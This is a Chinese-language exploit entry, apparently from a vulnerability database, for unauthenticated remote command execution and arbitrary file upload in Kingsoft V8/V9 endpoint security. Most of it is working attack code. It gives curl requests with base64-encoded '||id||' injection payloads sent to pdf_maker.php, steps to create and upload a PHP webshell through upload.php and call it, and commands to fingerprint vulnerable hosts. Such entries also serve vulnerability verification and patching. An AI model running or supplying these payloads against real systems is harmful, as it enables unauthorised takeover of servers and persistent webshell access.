---
id: KINGSOFT-V8-MULTI-RCE
title: 金山 V8/V9 终端安全系统 多接口远程命令执行及文件上传漏洞
product: kingsoft-v8
vendor: 金山
version_affected: "金山 V8/V9 终端安全系统"
severity: CRITICAL
tags: [rce, command_injection, file_upload, 无需认证, 国产]
fingerprint: ["金山", "猎鹰安全", "V8", "终端安全系统"]
---

## 漏洞描述

金山 V8/V9 终端安全系统存在多个远程漏洞：`pdf_maker.php` 接口的 `url` 参数经 base64 解码后被传入 `system()` 函数，可通过命令拼接执行任意命令；`/tools/manage/upload.php` 接口未做文件类型限制，可上传任意 PHP 文件。

## 影响版本

- 金山 V8 终端安全系统
- 金山 V9 终端安全系统

## 前置条件

- 无需认证

## 利用步骤

### 方式一：pdf_maker.php 命令执行

1. 将命令拼接字符串 base64 编码后放入 `url` 参数
2. 向 `/inter/pdf_maker.php` 发送 POST 请求
3. 命令在服务器端执行

### 方式二：upload.php 文件上传

1. 向 `/tools/manage/upload.php` 上传 PHP webshell
2. 访问上传的文件

## Payload

### pdf_maker.php 命令执行

```bash
# 编码: "||whoami||" → base64
curl -s "http://target/inter/pdf_maker.php" \
  -d "url=fHx3aG9hbWl8fA==&fileName=dGVzdA=="
```

### 生成 payload 的方法

```bash
echo -n '||id||' | base64
# fHxpZHx8
curl -s "http://target/inter/pdf_maker.php" \
  -d "url=fHxpZHx8&fileName=dGVzdA=="
```

### upload.php 文件上传

```bash
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
curl -s "http://target/tools/manage/upload.php" \
  -F "file=@/tmp/shell.php;filename=cmd.php"
```

### 访问 webshell

```bash
curl -s "http://target/tools/manage/cmd.php?cmd=id"
```

## 验证方法

```bash
# pdf_maker.php
curl -s "http://target/inter/pdf_maker.php" \
  -d "url=fHxpZHx8&fileName=dGVzdA=="

# upload.php
curl -s "http://target/tools/manage/upload.php" -o /dev/null -w "%{http_code}"
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "金山\|猎鹰安全\|V8\|终端安全"
```
